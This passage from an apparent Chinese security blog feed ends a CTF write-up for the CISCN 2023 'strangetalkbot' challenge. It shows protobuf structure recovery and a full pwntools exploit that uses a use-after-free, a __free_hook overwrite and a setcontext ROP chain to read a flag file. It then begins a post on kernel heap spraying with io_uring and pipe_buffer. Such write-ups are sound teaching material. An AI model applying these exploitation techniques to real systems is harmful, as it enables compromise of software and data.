mappedto_22)</span><br><span class="line"><span class="number">00000000</span> alloc dq ?</span><br><span class="line"><span class="number">00000008</span> <span class="built_in">free</span> dq ?</span><br><span class="line"><span class="number">00000010</span> allocator_data dq ?</span><br><span class="line"><span class="number">00000018</span> ProtobufCAllocator ends</span><br><span class="line"><span class="number">00000018</span></span><br><span class="line"><span class="number">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> ProtobufCFieldDescriptor struc ; (<span class="keyword">sizeof</span>=<span class="number">0x44</span>, mappedto_23)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: .data.rel.ro:stru_9B60/r</span><br><span class="line"><span class="number">00000000</span> name dq ?</span><br><span class="line"><span class="number">00000008</span> id dd ?</span><br><span class="line"><span class="number">0000000</span>C label dd ?</span><br><span class="line"><span class="number">00000010</span> type dd ?</span><br><span class="line"><span class="number">00000014</span> quantifier_offset dd ?</span><br><span class="line"><span class="number">00000018</span> offset dd ?</span><br><span class="line"><span class="number">0000001</span>C descriptor dq ?</span><br><span class="line"><span class="number">00000024</span> default_value dq ?</span><br><span class="line"><span class="number">0000002</span>C flags dd ?</span><br><span class="line"><span class="number">00000030</span> reserved_flags dd ?</span><br><span class="line"><span class="number">00000034</span> reserved2 dq ?</span><br><span class="line"><span class="number">0000003</span>C reserved3 dq ?</span><br><span class="line"><span class="number">00000044</span> ProtobufCFieldDescriptor ends</span><br></pre></td></tr></table></figure><p>在前面我们提到了<code>ProtobufCFieldDescriptor</code>结构体，这个结构体中存储着结构体中所有成员的数据类型，并且第一个成员是指向其名字的地址，那么我们可以根据字符串找到结构体相印的位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:0000000000009B60 80 70 00 00 00 00 00 00 01 00+stru_9B60 ProtobufCFieldDescriptor &lt;7080h, 1, 0, 4, 0, 18h, 0, 0, 0, 0, 0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000009B60 00 00 00 00 00 00 04 00 00 00+                                        ; DATA XREF: .data.rel.ro:0000000000009CB8↓o</span><br><span class="line">.data.rel.ro:0000000000009BA4 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BA5 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BA6 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BA7 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BA8                               ; ProtobufCFieldDescriptor</span><br><span class="line">.data.rel.ro:0000000000009BA8 89 70 00 00 00 00 00 00 02 00+ProtobufCFieldDescriptor &lt;7089h, 2, 0, 4, 0, 20h, 0, 0, 0, 0, 0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000009BEC 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BED 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BEE 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BEF 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009BF0                               ; ProtobufCFieldDescriptor</span><br><span class="line">.data.rel.ro:0000000000009BF0 90 70 00 00 00 00 00 00 03 00+ProtobufCFieldDescriptor &lt;7090h, 3, 0, 4, 0, 28h, 0, 0, 0, 0, 0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000009C34 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009C35 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009C36 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009C37 00                            db    0</span><br><span class="line">.data.rel.ro:0000000000009C38                               ; ProtobufCFieldDescriptor</span><br><span class="line">.data.rel.ro:0000000000009C38 98 70 00 00 00 00 00 00 04 00+ProtobufCFieldDescriptor &lt;7098h, 4, 0, 0Fh, 0, 30h, 0, 0, 0, 0, 0, 0&gt;</span><br></pre></td></tr></table></figure><p>最终可以得出，前面三个成员的数据类型为<code>sint64</code>，最后一个成员的数据类型为<code>bytes</code>，所以可以自己写出<code>proto</code>文件了。</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">Devicemsg</span></span>&#123;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">sint64</span> actionid = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">sint64</span> msgidx = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">sint64</span> msgsize = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">bytes</span> msgcontent = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后使用上述代码生成<code>python</code>对应的文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Generated by the protocol buffer compiler.  DO NOT EDIT!</span></span><br><span class="line"><span class="comment"># source: Devicemsg.proto</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">_b=sys.version_info[<span class="number">0</span>]&lt;<span class="number">3</span> <span class="keyword">and</span> (<span class="keyword">lambda</span> x:x) <span class="keyword">or</span> (<span class="keyword">lambda</span> x:x.encode(<span class="string">&#x27;latin1&#x27;</span>))</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> descriptor <span class="keyword">as</span> _descriptor</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> message <span class="keyword">as</span> _message</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> reflection <span class="keyword">as</span> _reflection</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> symbol_database <span class="keyword">as</span> _symbol_database</span><br><span class="line"><span class="comment"># @@protoc_insertion_point(imports)</span></span><br><span class="line"></span><br><span class="line">_sym_db = _symbol_database.Default()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DESCRIPTOR = _descriptor.FileDescriptor(</span><br><span class="line">  name=<span class="string">&#x27;Devicemsg.proto&#x27;</span>,</span><br><span class="line">  package=<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  syntax=<span class="string">&#x27;proto2&#x27;</span>,</span><br><span class="line">  serialized_options=<span class="literal">None</span>,</span><br><span class="line">  serialized_pb=_b(<span class="string">&#x27;\n\x0f\x44\x65vicemsg.proto\&quot;R\n\tDevicemsg\x12\x10\n\x08\x61\x63tionid\x18\x01 \x02(\x12\x12\x0e\n\x06msgidx\x18\x02 \x02(\x12\x12\x0f\n\x07msgsize\x18\x03 \x02(\x12\x12\x12\n\nmsgcontent\x18\x04 \x02(\x0c&#x27;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_DEVICEMSG = _descriptor.Descriptor(</span><br><span class="line">  name=<span class="string">&#x27;Devicemsg&#x27;</span>,</span><br><span class="line">  full_name=<span class="string">&#x27;Devicemsg&#x27;</span>,</span><br><span class="line">  filename=<span class="literal">None</span>,</span><br><span class="line">  file=DESCRIPTOR,</span><br><span class="line">  containing_type=<span class="literal">None</span>,</span><br><span class="line">  fields=[</span><br><span class="line">    _descriptor.FieldDescriptor(</span><br><span class="line">      name=<span class="string">&#x27;actionid&#x27;</span>, full_name=<span class="string">&#x27;Devicemsg.actionid&#x27;</span>, index=<span class="number">0</span>,</span><br><span class="line">      number=<span class="number">1</span>, <span class="built_in">type</span>=<span class="number">18</span>, cpp_type=<span class="number">2</span>, label=<span class="number">2</span>,</span><br><span class="line">      has_default_value=<span class="literal">False</span>, default_value=<span class="number">0</span>,</span><br><span class="line">      message_type=<span class="literal">None</span>, enum_type=<span class="literal">None</span>, containing_type=<span class="literal">None</span>,</span><br><span class="line">      is_extension=<span class="literal">False</span>, extension_scope=<span class="literal">None</span>,</span><br><span class="line">      serialized_options=<span class="literal">None</span>, file=DESCRIPTOR),</span><br><span class="line">    _descriptor.FieldDescriptor(</span><br><span class="line">      name=<span class="string">&#x27;msgidx&#x27;</span>, full_name=<span class="string">&#x27;Devicemsg.msgidx&#x27;</span>, index=<span class="number">1</span>,</span><br><span class="line">      number=<span class="number">2</span>, <span class="built_in">type</span>=<span class="number">18</span>, cpp_type=<span class="number">2</span>, label=<span class="number">2</span>,</span><br><span class="line">      has_default_value=<span class="literal">False</span>, default_value=<span class="number">0</span>,</span><br><span class="line">      message_type=<span class="literal">None</span>, enum_type=<span class="literal">None</span>, containing_type=<span class="literal">None</span>,</span><br><span class="line">      is_extension=<span class="literal">False</span>, extension_scope=<span class="literal">None</span>,</span><br><span class="line">      serialized_options=<span class="literal">None</span>, file=DESCRIPTOR),</span><br><span class="line">    _descriptor.FieldDescriptor(</span><br><span class="line">      name=<span class="string">&#x27;msgsize&#x27;</span>, full_name=<span class="string">&#x27;Devicemsg.msgsize&#x27;</span>, index=<span class="number">2</span>,</span><br><span class="line">      number=<span class="number">3</span>, <span class="built_in">type</span>=<span class="number">18</span>, cpp_type=<span class="number">2</span>, label=<span class="number">2</span>,</span><br><span class="line">      has_default_value=<span class="literal">False</span>, default_value=<span class="number">0</span>,</span><br><span class="line">      message_type=<span class="literal">None</span>, enum_type=<span class="literal">None</span>, containing_type=<span class="literal">None</span>,</span><br><span class="line">      is_extension=<span class="literal">False</span>, extension_scope=<span class="literal">None</span>,</span><br><span class="line">      serialized_options=<span class="literal">None</span>, file=DESCRIPTOR),</span><br><span class="line">    _descriptor.FieldDescriptor(</span><br><span class="line">      name=<span class="string">&#x27;msgcontent&#x27;</span>, full_name=<span class="string">&#x27;Devicemsg.msgcontent&#x27;</span>, index=<span class="number">3</span>,</span><br><span class="line">      number=<span class="number">4</span>, <span class="built_in">type</span>=<span class="number">12</span>, cpp_type=<span class="number">9</span>, label=<span class="number">2</span>,</span><br><span class="line">      has_default_value=<span class="literal">False</span>, default_value=_b(<span class="string">&quot;&quot;</span>),</span><br><span class="line">      message_type=<span class="literal">None</span>, enum_type=<span class="literal">None</span>, containing_type=<span class="literal">None</span>,</span><br><span class="line">      is_extension=<span class="literal">False</span>, extension_scope=<span class="literal">None</span>,</span><br><span class="line">      serialized_options=<span class="literal">None</span>, file=DESCRIPTOR),</span><br><span class="line">  ],</span><br><span class="line">  extensions=[</span><br><span class="line">  ],</span><br><span class="line">  nested_types=[],</span><br><span class="line">  enum_types=[</span><br><span class="line">  ],</span><br><span class="line">  serialized_options=<span class="literal">None</span>,</span><br><span class="line">  is_extendable=<span class="literal">False</span>,</span><br><span class="line">  syntax=<span class="string">&#x27;proto2&#x27;</span>,</span><br><span class="line">  extension_ranges=[],</span><br><span class="line">  oneofs=[</span><br><span class="line">  ],</span><br><span class="line">  serialized_start=<span class="number">19</span>,</span><br><span class="line">  serialized_end=<span class="number">101</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">DESCRIPTOR.message_types_by_name[<span class="string">&#x27;Devicemsg&#x27;</span>] = _DEVICEMSG</span><br><span class="line">_sym_db.RegisterFileDescriptor(DESCRIPTOR)</span><br><span class="line"></span><br><span class="line">Devicemsg = _reflection.GeneratedProtocolMessageType(<span class="string">&#x27;Devicemsg&#x27;</span>, (_message.Message,), <span class="built_in">dict</span>(</span><br><span class="line">  DESCRIPTOR = _DEVICEMSG,</span><br><span class="line">  __module__ = <span class="string">&#x27;Devicemsg_pb2&#x27;</span></span><br><span class="line">  <span class="comment"># @@protoc_insertion_point(class_scope:Devicemsg)</span></span><br><span class="line">  ))</span><br><span class="line">_sym_db.RegisterMessage(Devicemsg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># @@protoc_insertion_point(module_scope)</span></span><br></pre></td></tr></table></figure><p>现在就只需要拿着这个文件去使用即可，后续的漏洞利用部分比较简单，这里就不详细说了。</p><h3 id="综上可得，exp"><a href="#综上可得，exp" class="headerlink" title="综上可得，exp"></a>综上可得，exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Devicemsg_pb2</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">idx, size, content=<span class="string">b&#x27;&#x27;</span></span>):</span></span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">1</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = size</span><br><span class="line">    msg.msgcontent = content</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">2</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = content</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">3</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">4</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    create(i, <span class="number">0xf0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">7</span>-i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recv(<span class="number">0x50</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base =&gt; &quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">heap_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x590</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_base =&gt; &quot;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">__free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">open_addr = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_addr = libc_base + libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ret_addr = libc_base + <span class="number">0x0000000000022679</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000142c92</span></span><br><span class="line">magic_gadget = libc_base + <span class="number">0x151990</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, flat(__free_hook, <span class="number">0</span>))</span><br><span class="line">create(<span class="number">8</span>, <span class="number">0xf0</span>)</span><br><span class="line">create(<span class="number">9</span>, <span class="number">0xf0</span>, flat(magic_gadget))</span><br><span class="line"></span><br><span class="line">flag_addr = heap_base + <span class="number">0x440</span></span><br><span class="line"></span><br><span class="line">rop_chain = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop_chain += flat(pop_rdi, flag_addr, pop_rsi, <span class="number">2</span>, open_addr)</span><br><span class="line">rop_chain += flat(pop_rdi, <span class="number">3</span>, pop_rsi, libc_base +</span><br><span class="line">                  libc.bss() + <span class="number">0x500</span>, pop_rdx, <span class="number">0x50</span>, read_addr)</span><br><span class="line">rop_chain += flat(pop_rdi, libc_base + libc.bss() + <span class="number">0x500</span>, puts_addr)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;./flag&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>, flag_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>) + flat(setcontext)</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>) + rop_chain</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + flat(flag_addr + <span class="number">0x28</span>, ret_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>, payload)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><hr><p>参考链接：</p><p>​    <a class="link"   href="https://xp0int.top/posts/2023/05/28/2023-CISCN-%E5%88%9D%E8%B5%9B-Writeup-By-Xp0int/#42-strangetalkbot" >https://xp0int.top/posts/2023/05/28/2023-CISCN-%E5%88%9D%E8%B5%9B-Writeup-By-Xp0int/#42-strangetalkbot<i class="fas fa-external-link-alt"></i></a></p><p>​    <a class="link"   href="https://github1s.com/protobuf-c/protobuf-c/blob/HEAD/protobuf-c/protobuf-c.c#L3028" >https://github1s.com/protobuf-c/protobuf-c/blob/HEAD/protobuf-c/protobuf-c.c#L3028<i class="fas fa-external-link-alt"></i></a></p><p>​    <a class="link"   href="https://www.jianshu.com/p/a7e88cb17031" >https://www.jianshu.com/p/a7e88cb17031<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;其实在以前已经多次遇见过&lt;code&gt;protobuf&lt;/code&gt;了，但是都不太在意因为总感觉会像musl库一样，存活一段时间后就消失了。所</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="UAF" scheme="https://cv196082.gitee.io/tags/UAF/"/>
    
    <category term="protobuf" scheme="https://cv196082.gitee.io/tags/protobuf/"/>
    
  </entry>
  
  <entry>
    <title>向pipe_buffer说yes！</title>
    <link href="https://cv196082.gitee.io/2023/05/24/pipe-buffer/"/>
    <id>https://cv196082.gitee.io/2023/05/24/pipe-buffer/</id>
    <published>2023-05-24T08:39:35.000Z</published>
    <updated>2023-05-24T08:39:41.227Z</updated>
    
    <content type="html"><![CDATA[<p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230510125707322.png"                      alt="image-20230510125707322"                ></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>起因是墨晚鸢大佬的一句回复，不过我这里还没尝试挖掘新的东西，更多的是对墨晚鸢佬的内容做适合自己理解的总结。可以看到标签中还有一个上一篇文章主要介绍的<code>io_uring</code>，这里就先说说。</p><p><del>万字警告！！！</del></p><h2 id="io-uring在堆喷中的局限性"><a href="#io-uring在堆喷中的局限性" class="headerlink" title="io_uring在堆喷中的局限性"></a>io_uring在堆喷中的局限性</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __io_account_mem(struct user_struct *user, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> page_limit, cur_pages, new_pages;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nr_pages)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Don&#x27;t allow more pages than we can safely lock */</span></span><br><span class="line">page_limit = rlimit(RLIMIT_MEMLOCK) &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">cur_pages = atomic_long_read(&amp;user-&gt;locked_vm);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">new_pages = cur_pages + nr_pages;</span><br><span class="line"><span class="keyword">if</span> (new_pages &gt; page_limit)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125; <span class="keyword">while</span> (!atomic_long_try_cmpxchg(&amp;user-&gt;locked_vm,</span><br><span class="line">  &amp;cur_pages, new_pages));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在我进行一次堆喷过后，并使用update去修改内容是会返回错误-12，则是在上面的函数中，<code>new_page</code>超过了可以安全lock的page数量，也就是<code>new_pages &gt; page_limit</code>导致的。</p><p>而上面这个函数最初是由<code>io_sqe_buffer_register</code>函数调用的，所以不幸的是在对<code>io_uring</code>进行分配的时候就要开始考虑了。所以在我们平时动不动就要面对4096次之类的大范围堆喷时<code>io_uring</code>就显得有点儿力不从心了。</p><p>不过除了以上这样一点缺点<code>io_uring</code>的表现依旧是令人满意的。</p><h2 id="slab分配源码分析"><a href="#slab分配源码分析" class="headerlink" title="slab分配源码分析"></a>slab分配源码分析</h2><p>众所周知，分配slab的机制为<code>buddy system</code>机制进行的。而进行分配的最终函数为<code>alloc_slab_page</code>函数进行分配，并且大家都知道<code>buddy system</code>分配时大小为<code>PAGE_SIZE * pow(2,order)</code>，所以order的由来就显得尤为重要了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">oo_order</span><span class="params">(struct kmem_cache_order_objects x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span 